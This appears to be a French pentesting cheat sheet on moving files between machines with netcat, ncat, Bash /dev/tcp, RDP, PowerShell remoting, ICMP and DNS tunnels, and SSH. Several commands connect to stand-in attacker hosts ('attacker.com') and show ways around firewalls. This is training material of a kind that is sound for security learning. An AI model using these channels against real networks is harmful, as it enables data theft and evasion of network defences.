# Techniques Spécialisées pour les Transferts

## Netcat et Alternatives

Ces outils permettent des transferts directs entre machines via des connexions TCP/UDP.

### Netcat Standard

```bash
# Réception (machine cible)
nc -l -p 8000 > file.bin

# Envoi (machine source)
nc target.com 8000 < file.bin

# Option pour fermer la connexion après le transfert (-q)
nc -q 0 target.com 8000 < file.bin
```

### Ncat (version améliorée)

```bash
# Réception - ferme après réception complète
ncat -l -p 8000 --recv-only > file.bin

# Envoi - ferme après envoi complet
ncat target.com 8000 --send-only < file.bin
```

### Contournement de Firewall (Connexions Inversées)

Utile quand le pare-feu bloque les connexions entrantes.

```bash
# Sur la machine attaquante (écoute sur port commun)
sudo nc -l -p 443 -q 0 < file.bin

# Sur la machine cible (initie la connexion)
nc attacker.com 443 > file.bin
```

### Utilisation de /dev/tcp sur Linux

```bash
# Réception via socket Bash
cat < /dev/tcp/attacker.com/443 > file.bin

# Envoi via socket Bash
cat file.bin > /dev/tcp/target.com/8000
```

## RDP et Sessions Distantes

### Transfert via Presse-papiers RDP

Utile pour les petits fichiers texte ou pour les environnements très restreints.

```
1. Copier le fichier sur la machine locale
2. Se connecter via RDP
3. Coller le contenu dans un fichier texte
```

### Montage de Ressources dans RDP

```bash
# Avec rdesktop
rdesktop target.com -u user -p password -r disk:local=/path/to/share

# Avec xfreerdp
xfreerdp /v:target.com /u:user /p:password /drive:share,/path/to/share

# Accès sur la cible Windows
\\tsclient\share\
```

## PowerShell Remoting

Pour les environnements Windows avec WinRM activé.

```powershell
# Créer une session
$session = New-PSSession -ComputerName target.com -Credential (Get-Credential)

# Copier un fichier vers la cible
Copy-Item -Path C:\local\file.bin -ToSession $session -Destination C:\remote\path\

# Copier un fichier depuis la cible
Copy-Item -Path C:\remote\file.bin -FromSession $session -Destination C:\local\path\
```

## ICMP Tunneling

Pour les environnements extrêmement restreints où seul ICMP est autorisé.

```bash
# Sur la machine attaquante (nécessite privilèges root)
sudo ptunnel -x password

# Sur la machine cible
ptunnel -p attacker.com -lp 8000 -da internal.server -dp 80 -x password

# Utilisation du tunnel (ex: avec curl)
curl http://localhost:8000/file.bin -o file.bin
```

## DNS Tunneling

Pour contourner les pare-feu qui autorisent uniquement le trafic DNS.

```bash
# Sur le serveur autoritaire (attaquant)
sudo iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# Sur la machine cible
iodine -P password tunnel.attacker.com

# Transfert via le tunnel créé
# La machine cible a maintenant une interface tun0 avec une IP dans le réseau 10.0.0.0/24
```

## Transferts via SSH

Pour les environnements Unix avec SSH.

```bash
# SCP (Secure Copy)
scp file.bin user@target.com:/remote/path/

# SFTP (interactive)
sftp user@target.com
> put file.bin
> get remote_file.bin

# Tunneling SSH pour contourner les restrictions
ssh -L 8080:restricted.server:80 user@pivot.server
# Accès au serveur restreint via localhost:8080
```

## Points Importants

- Netcat est souvent considéré comme un outil malveillant et peut être bloqué
- Les connexions inversées sont utiles quand les connexions entrantes sont bloquées
- RDP offre des méthodes simples pour les transferts rapides
- Les techniques de tunneling sont utiles dans les environnements très restreints
- Préférer les méthodes chiffrées (SSH) quand la confidentialité est importante